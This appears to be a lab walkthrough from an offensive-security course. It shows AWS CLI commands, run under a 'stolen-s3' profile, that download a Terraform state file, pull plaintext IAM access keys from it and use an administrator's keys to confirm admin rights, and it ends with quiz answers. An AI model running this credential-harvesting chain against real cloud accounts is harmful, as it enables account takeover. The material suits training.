# Discovering the State File and Escalating to Admin

Listing the Terraform State Bucket
>``` shell
>kali@kali:~$ aws --profile=stolen-s3 s3 ls tf-state-9b58rezp3vvkf90f   
>
># ========== Expected Result ==========
>2023-07-06 12:19:16       6731 terraform.tfstate
># =====================================
>```

Copying Terraform State File to Our Local Kali Instance
>``` shell
>kali@kali:~$ aws --profile=stolen-s3 s3 cp s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate ./
>
># ========== Expected Result ==========
>download: s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate to ./terraform.tfstate
># =====================================
>```

Reviewing State File - Users
>``` shell
>kali@kali:~$ cat -n terraform.tfstate
>
># ========== Expected Result ==========
>001  {
>...
>007      "user_list": {
>008        "value": [
>009          {
>010            "email": "Goran.Bregovic@offseclab.io",
>011            "name": "Goran.B",
>012            "phone": "+1 555-123-4567",
>013            "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
>014          },
>015          {
>016            "email": "Zeljko.Bebek@offseclab.io",
>017            "name": "Zeljko.B",
>018            "phone": "+1 555-123-4568",
>019            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
>020          },
>021          {
>022            "email": "Alen.Islamovic@offseclab.io",
>023            "name": "Alen.I",
>024            "phone": "+1 555-123-4569",
>025            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"
>026          }
>027        ],
>...
>041    },
># =====================================
>```

Reviewing State File - Keys
>``` shell
>kali@kali:~$ cat -n terraform.tfstate
>
># ========== Expected Result ==========
>042    "resources": [
>043      {
>...
>049          {
>050            "index_key": "Alen.I",
>051            "schema_version": 0,
>052            "attributes": {
>...
>056              "id": "AKIAUBHUBEGIKIZJ7OEI",
>...
>059              "secret": "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",
>...
>063            },
>...
>069          },
>070          {
>071            "index_key": "Goran.B",
>072            "schema_version": 0,
>073            "attributes": {
>...
>077              "id": "AKIAUBHUBEGIGZN3IP46",
>...
>080              "secret": "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",
>...
>084            },
>...
>090          },
>...
># =====================================
>```

Configuring Goran.B Profile Using AWS CLI
>``` shell
>kali@kali:~$ aws configure --profile=goran.b 
>
># ========== Expected Result ==========
>AWS Access Key ID [None]: AKIAUBHUBEGIGZN3IP46
>AWS Secret Access Key [None]: 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
>Default region name [None]: us-east-1
>Default output format [None]: 
># =====================================
>```

Listing Attached User Policies with Goran.B Profile
>``` shell
>kali@kali:~$ aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
>
># ========== Expected Result ==========
>{
>    "AttachedPolicies": [
>        {
>            "PolicyName": "AdministratorAccess",
>            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
>        }
>    ]
>}
># =====================================
>```

Lab 1 - What permissions are required to list and read the Terraform state file?
>C) List and read permissions

Lab 2 - What information is discovered in the Terraform state file related to the users?
>B) Usernames and their associated AWS policies

Lab 3 - Discover the flag in the ec2 instance tag.
>``` shell
>
>```
>
